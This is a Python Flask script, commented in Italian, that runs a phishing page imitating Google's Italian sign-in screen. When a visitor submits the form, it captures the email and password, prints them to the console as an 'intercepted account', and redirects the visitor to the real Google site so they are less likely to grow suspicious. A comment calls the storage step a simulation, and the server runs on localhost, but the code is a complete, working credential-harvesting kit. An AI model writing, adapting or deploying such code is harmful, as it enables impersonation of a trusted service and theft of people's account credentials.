from flask import Flask, request, render_template_string
import datetime

app = Flask(__name__)

# --- TEMPLATE GOOGLE SIMULATO (HTML + CSS) ---

GOOGLE_LOGIN_PAGE = """
<!DOCTYPE html>
<html lang="it">
<head>
    <meta charset="UTF-8">
    <title>Accedi - Account Google</title>
    <style>
        body {
            font-family: 'Roboto', arial, sans-serif;
            background-color: #fff;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
        }
        .card {
            background: #fff;
            border: 1px solid #dadce0;
            border-radius: 8px;
            padding: 48px 40px 36px;
            width: 450px;
            max-width: 100%;
            text-align: center;
            box-sizing: border-box;
        }
        .logo {
            margin-bottom: 10px;
            font-size: 24px;
            font-weight: bold;
        }
        /* Colori del logo Google */
        .g-blue { color: #4285F4; }
        .g-red { color: #EA4335; }
        .g-yellow { color: #FBBC05; }
        .g-green { color: #34A853; }

        h1 {
            color: #202124;
            font-size: 24px;
            font-weight: 400;
            margin: 0 0 10px;
        }
        p {
            color: #202124;
            font-size: 16px;
            margin-bottom: 40px;
        }
        input {
            width: 100%;
            padding: 13px 15px;
            margin: 10px 0;
            border: 1px solid #dadce0;
            border-radius: 4px;
            font-size: 16px;
            box-sizing: border-box;
        }
        input:focus {
            outline: none;
            border: 2px solid #1a73e8;
            padding: 12px 14px; /* Compensate for border width */
        }
        .btn-container {
            display: flex;
            justify-content: flex-end;
            margin-top: 30px;
        }
        button {
            background-color: #1a73e8;
            color: white;
            border: none;
            border-radius: 4px;
            padding: 10px 24px;
            font-weight: bold;
            font-size: 14px;
            cursor: pointer;
        }
        button:hover {
            background-color: #1557b0;
            box-shadow: 0 1px 2px 0 rgba(60,64,67,0.3);
        }
        .footer {
            margin-top: 20px;
            font-size: 12px;
            color: #5f6368;
        }
    </style>
</head>
<body>

    <div class="card">
        <div class="logo">
            <span class="g-blue">G</span><span class="g-red">o</span><span class="g-yellow">o</span><span class="g-blue">g</span><span class="g-green">l</span><span class="g-red">e</span>
        </div>
        
        <h1>Accedi</h1>
        <p>Utilizza il tuo Account Google</p>

        <form method="POST">
            <input type="email" name="email" placeholder="Indirizzo email o numero di telefono" required>
            <input type="password" name="password" placeholder="Inserisci la password" required>
            
            <div style="text-align: left; margin-bottom: 20px;">
                <a href="#" style="text-decoration: none; color: #1a73e8; font-size: 14px; font-weight: 500;">Password dimenticata?</a>
            </div>

            <div class="btn-container">
                <button type="submit">Avanti</button>
            </div>
        </form>
    </div>

    <div class="footer">
        Italiano &nbsp; Guida &nbsp; Privacy &nbsp; Termini
    </div>

</body>
</html>
"""

@app.route('/', methods=['GET', 'POST'])
def phishing_listener():
    # 1. La vittima apre la pagina
    if request.method == 'GET':
        print(f"[{datetime.datetime.now()}] VITTIMA SULLA PAGINA: Visualizzazione Fake Google Login")
        return render_template_string(GOOGLE_LOGIN_PAGE)
    
    # 2. La vittima invia i dati
    if request.method == 'POST':
        email_rubata = request.form.get('email')
        password_rubata = request.form.get('password')
        
        # Simulazione salvataggio database hacker
        print("\n" + "#"*60)
        print("   >>> GOOGLE ACCOUNT INTERCETTATO <<<")
        print(f"   TIME:     {datetime.datetime.now()}")
        print(f"   EMAIL:    {email_rubata}")
        print(f"   PASSWORD: {password_rubata}")
        print("#"*60 + "\n")
        
        # Dopo il furto, reindirizziamo a Google vero per non destare sospetti
        
        return """
        <script>
            window.location.href = "https://www.google.com";
        </script>
        """

if __name__ == '__main__':
    print("--- SERVER GOOGLE FAKE AVVIATO ---")
    print("Apri il browser su: http://127.0.0.1:5000")
    app.run(debug=True, port=5000)